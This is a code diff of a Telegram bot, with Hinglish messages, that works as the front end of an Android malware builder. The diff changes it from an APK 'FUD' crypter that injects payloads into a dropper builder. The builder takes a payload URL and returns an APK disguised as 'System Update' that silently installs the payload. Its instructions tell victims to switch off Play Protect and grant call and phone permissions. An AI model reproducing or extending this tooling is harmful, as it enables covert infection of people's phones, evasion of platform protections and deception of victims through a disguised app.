@@ -11,17 +11,14 @@ RENDER_URL = os.environ.get("RENDER_URL")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [
-        [InlineKeyboardButton("🚀 Build FUD APK", callback_data="build")],
-        [InlineKeyboardButton("🛡️ Bypass Play Protect", callback_data="bypass")],
-        [InlineKeyboardButton("📊 Server Status", callback_data="status")]
+        [InlineKeyboardButton("🚀 Build Dropper APK", callback_data="build")],
+        [InlineKeyboardButton("🛡️ Bypass Play Protect", callback_data="bypass")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        "🔥 **Welcome to Sable FUD Builder** 🔥\n\n"
-        "Main ek advanced APK Fudding tool hoon. Mujhe koi bhi APK bhej, "
-        "main usme payload daal kar aur Play Protect ko bypass karke tujhe wapas dunga.\n\n"
-        "Neeche diye gaye buttons ka use kar:",
+        "🔥 **Welcome to Sable Dropper Builder** 🔥\n\n"
+        "Mujhe payload ka direct download link bhej, main ek naya APK bana dunga jo background me chupke se payload install karega.",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -31,50 +28,48 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     if query.data == "build":
-        await query.edit_message_text("📥 **APK bhej...**\n\nMain isko fud karke wapas dunga. (File attach karke bhej).", parse_mode='Markdown')
+        await query.edit_message_text("📥 **Payload APK ka direct link bhej...**", parse_mode='Markdown')
+        context.user_data['waiting_for_url'] = True
     elif query.data == "bypass":
         await query.edit_message_text("🛡️ **Play Protect Bypass Guide:**\n\n"
                                       "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
                                       "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
-                                      "3. APK install karo (Bina kisi warning ke install hoga).\n"
+                                      "3. APK install karo.\n"
                                       "4. Install ke baad Play Protect wapas ON kar lena.", parse_mode='Markdown')
-    elif query.data == "status":
-        await query.edit_message_text("✅ **Server Status:**\nServer: Online 🟢\nBot: Online 🟢\n\nSab kuch ready hai baby!", parse_mode='Markdown')
 
-async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    if not doc or not doc.file_name.endswith(".apk"):
-        await update.message.reply_text("Ye APK nahi hai baby. Sahi APK file bhej.")
+async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get('waiting_for_url'):
         return
 
-    progress_msg = await update.message.reply_text("⏳ [□□□□□□□□□□] 0%\n**FUD Process Started...**\nFile server ko bheji ja rahi hai...", parse_mode='Markdown')
+    payload_url = update.message.text.strip()
+    if not payload_url.startswith("http"):
+        await update.message.reply_text("❌ Ye sahi link nahi lag raha. Kripya direct download link bhej.")
+        return
+
+    context.user_data['waiting_for_url'] = False
+    progress_msg = await update.message.reply_text("⏳ **Dropper APK ban raha hai...**\nThoda wait karo.", parse_mode='Markdown')
 
     try:
-        file = await context.bot.get_file(doc.file_id)
-        file_url = file.file_path
+        server_endpoint = f"{RENDER_URL}/generate" if RENDER_URL.endswith("/") else f"{RENDER_URL}/generate"
         
-        await progress_msg.edit_text("⏳ [■■■□□□□□□□] 30%\n**Injecting Dropper...**\nServer pe download ho raha hai...", parse_mode='Markdown')
-        await progress_msg.edit_text("⏳ [■■■■■□□□□□] 50%\n**Bypassing Play Protect...**\nAPK fud kar raha hai (Thoda time lagta hai)...", parse_mode='Markdown')
-        
-        response = requests.post(RENDER_URL, json={"apk_url": file_url}, timeout=300)
+        response = requests.post(server_endpoint, json={
+            "payload_url": payload_url,
+            "app_name": "System Update" # Yahan naam badal sakta hai
+        }, timeout=300)
 
         if response.status_code == 200:
-            await progress_msg.edit_text("⏳ [■■■■■■■■□□] 90%\n**Crypting Payload...**\nFile send ho rahi hai...", parse_mode='Markdown')
+            await progress_msg.edit_text("✅ **APK Ready Hai!**", parse_mode='Markdown')
             
             await update.message.reply_document(
                 document=response.content,
-                filename="Fudded_App.apk",
+                filename="System_Update.apk",
                 caption=(
-                    "✅ [■■■■■■■■■■] 100%\n\n"
-                    "**FUD APK Ready Hai Baby!**\n\n"
-                    "**⚠️ IMPORTANT: Is APK ko install karne ke liye Play Protect OFF karna padega!**\n\n"
+                    "🔥 **Standalone Dropper Ready!**\n\n"
                     "**Install Karne Ka Tarika:**\n"
-                    "1. Play Store kholo > Profile icon > **Play Protect** > Settings (Gear).\n"
-                    "2. **'Scan apps with Play Protect'** ko OFF kar do.\n"
-                    "3. Ab ye APK install karo. (Bina kisi warning ke seedha install hoga).\n"
-                    "4. Install ke baad jo permissions maange (Call/Phone), unko **Allow** karna.\n"
-                    "5. App home screen pe apne asli icon ke saath show hogi.\n"
-                    "6. Play Protect ko baad me wapas ON kar sakte ho."
+                    "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
+                    "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
+                    "3. Ye APK install karo.\n"
+                    "4. Install hote hi ye background me tera payload install kar dega."
                 ),
                 parse_mode='Markdown'
             )
@@ -86,16 +81,8 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except:
                 error_msg = response.text
             
-            if len(error_msg) > 200:
-                error_msg = error_msg[:200] + "..."
+            await progress_msg.edit_text(f"❌ **Server Error:**\n`{error_msg[:200]}`", parse_mode='Markdown')
 
-            await progress_msg.edit_text(
-                f"❌ **Server Error!**\n\nServer ne kaha:\n`{error_msg}`", 
-                parse_mode='Markdown'
-            )
-            
-    except requests.exceptions.Timeout:
-        await progress_msg.edit_text("❌ **Timeout Error!**\nServer ne 5 minute me jawab nahi diya.")
     except Exception as e:
         await progress_msg.edit_text(f"❌ **Error aaya:**\n`{str(e)}`", parse_mode='Markdown')
 
@@ -103,8 +90,8 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
-    print("Bot is running...")
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
+    print("Standalone Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
